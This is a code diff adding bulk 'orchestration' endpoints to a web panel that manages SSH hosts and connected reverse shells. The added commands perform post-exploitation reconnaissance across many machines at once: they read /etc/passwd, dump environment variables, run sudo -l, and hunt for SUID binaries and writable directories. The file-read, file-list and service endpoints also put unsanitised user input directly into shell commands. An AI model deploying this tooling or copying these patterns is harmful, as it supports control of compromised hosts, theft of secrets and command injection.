-                jump_username=host.jump_username,
-                jump_auth_mode=host.jump_auth_mode,
-                jump_key_path=host.jump_key_path,
-                jump_password=decrypt_secret(host.jump_password_encrypted) if host.jump_password_encrypted else None,
+                jump_host=jump_host,
             )
-            # Try a simple test command
-            success, _, _ = run_ssh_command(endpoint, LIVENESS_CHECK_COMMAND, timeout=5)
-            if success:
+            if result.return_code == 0:
                 online += 1
                 host.is_active = True
             else:
@@ -1399,3 +1580,380 @@ def bulk_delete_shells():
     db.session.commit()
     
     return jsonify({"deleted": deleted})
+
+
+# ============================================================================
+# Orchestration API Endpoints
+# ============================================================================
+
+
+def _orchestrate_ssh(host_ids: list, command: str, timeout: int = 30) -> list[dict]:
+    """Run a command on multiple SSH hosts and return results."""
+    hosts = Host.query.filter(Host.id.in_(host_ids), Host.is_active.is_(True)).all()
+    results = []
+    max_workers = min(max(len(hosts), 1), 8)
+
+    host_configs = {}
+    for host in hosts:
+        try:
+            host_configs[host.id] = {
+                'host': host,
+                'target': _build_target(host),
+                'jump_host': _build_jump(host),
+            }
+        except Exception as exc:
+            results.append({'host_id': host.id, 'host_name': host.name, 'success': False, 'output': f"Config error: {exc}"})
+
+    with ThreadPoolExecutor(max_workers=max_workers) as executor:
+        futures = {
+            executor.submit(
+                _run_command_for_host,
+                cfg['host'], command, timeout, cfg['target'], cfg['jump_host']
+            ): cfg['host']
+            for cfg in host_configs.values()
+        }
+        for future in as_completed(futures):
+            host = futures[future]
+            try:
+                _, result = future.result()
+                results.append({
+                    'host_id': host.id,
+                    'host_name': host.name,
+                    'success': result.return_code == 0,
+                    'stdout': result.stdout,
+                    'stderr': result.stderr,
+                    'return_code': result.return_code,
+                })
+            except Exception as exc:
+                results.append({'host_id': host.id, 'host_name': host.name, 'success': False, 'output': str(exc)})
+
+    return results
+
+
+def _orchestrate_shells(shell_ids: list, command: str, timeout: int = 30) -> list[dict]:
+    """Run a command on multiple reverse shells and return results."""
+    shells = ReverseShell.query.filter(ReverseShell.id.in_(shell_ids), ReverseShell.is_active.is_(True)).all()
+    listener = get_listener(current_app._get_current_object())
+    active = set(listener.get_active_shells())
+    results = []
+
+    for shell in shells:
+        if shell.id not in active:
+            results.append({'shell_id': shell.id, 'shell_name': shell.name, 'success': False, 'output': 'Shell is not connected'})
+            continue
+        try:
+            success, output = listener.execute_command(shell.id, command, timeout=timeout)
+            results.append({'shell_id': shell.id, 'shell_name': shell.name, 'success': success, 'output': output})
+        except Exception as exc:
+            results.append({'shell_id': shell.id, 'shell_name': shell.name, 'success': False, 'output': str(exc)})
+
+    return results
+
+
+@main_bp.route("/api/orchestrate/system-info", methods=["POST"])
+@login_required
+def orchestrate_system_info():
+    """Gather system information from selected hosts/shells.
+
+    Request JSON: {"type": "ssh" | "shell", "ids": [1, 2, 3]}
+    """
+    data = request.get_json()
+    if not data:
+        return jsonify({"success": False, "error": "Request body required"}), 400
+
+    target_type = data.get("type", "shell")
+    ids = data.get("ids", [])
+    if not ids:
+        return jsonify({"success": False, "error": "No IDs provided"}), 400
+
+    command = "echo '===HOSTNAME==='; hostname 2>/dev/null; echo '===OS==='; uname -a 2>/dev/null || ver 2>nul; echo '===UPTIME==='; uptime 2>/dev/null; echo '===MEMORY==='; free -h 2>/dev/null || systeminfo 2>nul | findstr Memory; echo '===DISK==='; df -h 2>/dev/null || wmic logicaldisk get size,freespace,caption 2>nul; echo '===CPU==='; nproc 2>/dev/null || echo %NUMBER_OF_PROCESSORS% 2>nul"
+    timeout = current_app.config.get("REMOTE_COMMAND_TIMEOUT", 30)
+
+    if target_type == "ssh":
+        results = _orchestrate_ssh(ids, command, timeout)
+    else:
+        results = _orchestrate_shells(ids, command, timeout)
+
+    return jsonify({"success": True, "results": results})
+
+
+@main_bp.route("/api/orchestrate/network-info", methods=["POST"])
+@login_required
+def orchestrate_network_info():
+    """Gather network information from selected hosts/shells.
+
+    Request JSON: {"type": "ssh" | "shell", "ids": [1, 2, 3]}
+    """
+    data = request.get_json()
+    if not data:
+        return jsonify({"success": False, "error": "Request body required"}), 400
+
+    target_type = data.get("type", "shell")
+    ids = data.get("ids", [])
+    if not ids:
+        return jsonify({"success": False, "error": "No IDs provided"}), 400
+
+    command = "echo '===INTERFACES==='; ip addr 2>/dev/null || ifconfig 2>/dev/null || ipconfig 2>nul; echo '===ROUTES==='; ip route 2>/dev/null || route -n 2>/dev/null || route print 2>nul; echo '===DNS==='; cat /etc/resolv.conf 2>/dev/null; echo '===CONNECTIONS==='; ss -tuln 2>/dev/null || netstat -tuln 2>/dev/null || netstat -an 2>nul"
+    timeout = current_app.config.get("REMOTE_COMMAND_TIMEOUT", 30)
+
+    if target_type == "ssh":
+        results = _orchestrate_ssh(ids, command, timeout)
+    else:
+        results = _orchestrate_shells(ids, command, timeout)
+
+    return jsonify({"success": True, "results": results})
+
+
+@main_bp.route("/api/orchestrate/process-list", methods=["POST"])
+@login_required
+def orchestrate_process_list():
+    """Get running processes from selected hosts/shells.
+
+    Request JSON: {"type": "ssh" | "shell", "ids": [1, 2, 3]}
+    """
+    data = request.get_json()
+    if not data:
+        return jsonify({"success": False, "error": "Request body required"}), 400
+
+    target_type = data.get("type", "shell")
+    ids = data.get("ids", [])
+    if not ids:
+        return jsonify({"success": False, "error": "No IDs provided"}), 400
+
+    command = "ps aux 2>/dev/null || tasklist 2>nul"
+    timeout = current_app.config.get("REMOTE_COMMAND_TIMEOUT", 30)
+
+    if target_type == "ssh":
+        results = _orchestrate_ssh(ids, command, timeout)
+    else:
+        results = _orchestrate_shells(ids, command, timeout)
+
+    return jsonify({"success": True, "results": results})
+
+
+@main_bp.route("/api/orchestrate/user-info", methods=["POST"])
+@login_required
+def orchestrate_user_info():
+    """Get user/account information from selected hosts/shells.
+
+    Request JSON: {"type": "ssh" | "shell", "ids": [1, 2, 3]}
+    """
+    data = request.get_json()
+    if not data:
+        return jsonify({"success": False, "error": "Request body required"}), 400
+
+    target_type = data.get("type", "shell")
+    ids = data.get("ids", [])
+    if not ids:
+        return jsonify({"success": False, "error": "No IDs provided"}), 400
+
+    command = "echo '===CURRENT_USER==='; whoami 2>/dev/null; echo '===ID==='; id 2>/dev/null; echo '===LOGGED_IN==='; who 2>/dev/null || query user 2>nul; echo '===USERS==='; cat /etc/passwd 2>/dev/null | head -30 || net user 2>nul; echo '===SUDO==='; sudo -l 2>/dev/null || echo 'sudo not available'"
+    timeout = current_app.config.get("REMOTE_COMMAND_TIMEOUT", 30)
+
+    if target_type == "ssh":
+        results = _orchestrate_ssh(ids, command, timeout)
+    else:
+        results = _orchestrate_shells(ids, command, timeout)
+
+    return jsonify({"success": True, "results": results})
+
+
+@main_bp.route("/api/orchestrate/service-status", methods=["POST"])
+@login_required
+def orchestrate_service_status():
+    """Get service/daemon status from selected hosts/shells.
+
+    Request JSON: {"type": "ssh" | "shell", "ids": [1, 2, 3], "service": "nginx" (optional)}
+    """
+    data = request.get_json()
+    if not data:
+        return jsonify({"success": False, "error": "Request body required"}), 400
+
+    target_type = data.get("type", "shell")
+    ids = data.get("ids", [])
+    service = data.get("service", "").strip()
+    if not ids:
+        return jsonify({"success": False, "error": "No IDs provided"}), 400
+
+    if service:
+        command = f"systemctl status {service} 2>/dev/null || service {service} status 2>/dev/null || sc query {service} 2>nul"
+    else:
+        command = "systemctl list-units --type=service --state=running 2>/dev/null | head -60 || service --status-all 2>/dev/null | head -60 || sc query state= all 2>nul"
+    timeout = current_app.config.get("REMOTE_COMMAND_TIMEOUT", 30)
+
+    if target_type == "ssh":
+        results = _orchestrate_ssh(ids, command, timeout)
+    else:
+        results = _orchestrate_shells(ids, command, timeout)
+
+    return jsonify({"success": True, "results": results})
+
+
+@main_bp.route("/api/orchestrate/file-read", methods=["POST"])
+@login_required
+def orchestrate_file_read():
+    """Read a file from selected hosts/shells.
+
+    Request JSON: {"type": "ssh" | "shell", "ids": [1, 2, 3], "path": "/etc/hostname"}
+    """
+    data = request.get_json()
+    if not data:
+        return jsonify({"success": False, "error": "Request body required"}), 400
+
+    target_type = data.get("type", "shell")
+    ids = data.get("ids", [])
+    file_path = data.get("path", "").strip()
+    if not ids or not file_path:
+        return jsonify({"success": False, "error": "IDs and file path required"}), 400
+
+    command = f"cat {file_path} 2>/dev/null || type {file_path} 2>nul || echo 'File not found'"
+    timeout = current_app.config.get("REMOTE_COMMAND_TIMEOUT", 30)
+
+    if target_type == "ssh":
+        results = _orchestrate_ssh(ids, command, timeout)
+    else:
+        results = _orchestrate_shells(ids, command, timeout)
+
+    return jsonify({"success": True, "results": results})
+
+
+@main_bp.route("/api/orchestrate/file-list", methods=["POST"])
+@login_required
+def orchestrate_file_list():
+    """List files in a directory on selected hosts/shells.
+
+    Request JSON: {"type": "ssh" | "shell", "ids": [1, 2, 3], "path": "/tmp"}
+    """
+    data = request.get_json()
+    if not data:
+        return jsonify({"success": False, "error": "Request body required"}), 400
+
+    target_type = data.get("type", "shell")
+    ids = data.get("ids", [])
+    dir_path = data.get("path", "/tmp").strip()
+    if not ids:
+        return jsonify({"success": False, "error": "No IDs provided"}), 400
+
+    command = f"ls -la {dir_path} 2>/dev/null || dir {dir_path} 2>nul"
+    timeout = current_app.config.get("REMOTE_COMMAND_TIMEOUT", 30)
+
+    if target_type == "ssh":
+        results = _orchestrate_ssh(ids, command, timeout)
+    else:
+        results = _orchestrate_shells(ids, command, timeout)
+
+    return jsonify({"success": True, "results": results})
+
+
+@main_bp.route("/api/orchestrate/cron-jobs", methods=["POST"])
+@login_required
+def orchestrate_cron_jobs():
+    """Get scheduled tasks/cron jobs from selected hosts/shells.
+
+    Request JSON: {"type": "ssh" | "shell", "ids": [1, 2, 3]}
+    """
+    data = request.get_json()
+    if not data:
+        return jsonify({"success": False, "error": "Request body required"}), 400
+
+    target_type = data.get("type", "shell")
+    ids = data.get("ids", [])
+    if not ids:
+        return jsonify({"success": False, "error": "No IDs provided"}), 400
+
+    command = "echo '===USER_CRONTAB==='; crontab -l 2>/dev/null || echo 'No crontab'; echo '===SYSTEM_CRON==='; ls -la /etc/cron.d/ 2>/dev/null; cat /etc/crontab 2>/dev/null || schtasks /query 2>nul"
+    timeout = current_app.config.get("REMOTE_COMMAND_TIMEOUT", 30)
+
+    if target_type == "ssh":
+        results = _orchestrate_ssh(ids, command, timeout)
+    else:
+        results = _orchestrate_shells(ids, command, timeout)
+
+    return jsonify({"success": True, "results": results})
+
+
+@main_bp.route("/api/orchestrate/env-info", methods=["POST"])
+@login_required
+def orchestrate_env_info():
+    """Get environment variables from selected hosts/shells.
+
+    Request JSON: {"type": "ssh" | "shell", "ids": [1, 2, 3]}
+    """
+    data = request.get_json()
+    if not data:
+        return jsonify({"success": False, "error": "Request body required"}), 400
+
+    target_type = data.get("type", "shell")
+    ids = data.get("ids", [])
+    if not ids:
+        return jsonify({"success": False, "error": "No IDs provided"}), 400
+
+    command = "env 2>/dev/null || set 2>nul"
+    timeout = current_app.config.get("REMOTE_COMMAND_TIMEOUT", 30)
+
+    if target_type == "ssh":
+        results = _orchestrate_ssh(ids, command, timeout)
+    else:
+        results = _orchestrate_shells(ids, command, timeout)
+
+    return jsonify({"success": True, "results": results})
+
+
+@main_bp.route("/api/orchestrate/security-check", methods=["POST"])
+@login_required
+def orchestrate_security_check():
+    """Run basic security checks on selected hosts/shells.
+
+    Request JSON: {"type": "ssh" | "shell", "ids": [1, 2, 3]}
+    """
+    data = request.get_json()
+    if not data:
+        return jsonify({"success": False, "error": "Request body required"}), 400
+
+    target_type = data.get("type", "shell")
+    ids = data.get("ids", [])
+    if not ids:
+        return jsonify({"success": False, "error": "No IDs provided"}), 400
+
+    command = (
+        "echo '===SUID_FILES==='; find / -perm -4000 -type f 2>/dev/null | head -20; "
+        "echo '===WRITABLE_DIRS==='; find / -writable -type d 2>/dev/null | head -20; "
+        "echo '===OPEN_PORTS==='; ss -tuln 2>/dev/null || netstat -tuln 2>/dev/null; "
+        "echo '===FIREWALL==='; iptables -L -n 2>/dev/null || ufw status 2>/dev/null || netsh advfirewall show allprofiles 2>nul; "
+        "echo '===SSH_CONFIG==='; cat /etc/ssh/sshd_config 2>/dev/null | grep -v '^#' | grep -v '^$' | head -20"
+    )
+    timeout = current_app.config.get("REMOTE_COMMAND_TIMEOUT", 30)
+
+    if target_type == "ssh":
+        results = _orchestrate_ssh(ids, command, timeout)
+    else:
+        results = _orchestrate_shells(ids, command, timeout)
+
+    return jsonify({"success": True, "results": results})
+
+
+@main_bp.route("/api/orchestrate/package-list", methods=["POST"])
+@login_required
+def orchestrate_package_list():
+    """List installed packages on selected hosts/shells.
+
+    Request JSON: {"type": "ssh" | "shell", "ids": [1, 2, 3]}
+    """
+    data = request.get_json()
+    if not data:
+        return jsonify({"success": False, "error": "Request body required"}), 400
+
+    target_type = data.get("type", "shell")
+    ids = data.get("ids", [])
+    if not ids:
+        return jsonify({"success": False, "error": "No IDs provided"}), 400
+
+    command = "dpkg -l 2>/dev/null | head -50 || rpm -qa 2>/dev/null | head -50 || apk list --installed 2>/dev/null | head -50 || wmic product get name 2>nul"
+    timeout = current_app.config.get("REMOTE_COMMAND_TIMEOUT", 30)
+
+    if target_type == "ssh":
+        results = _orchestrate_ssh(ids, command, timeout)
+    else:
+        results = _orchestrate_shells(ids, command, timeout)
+
+    return jsonify({"success": True, "results": results})
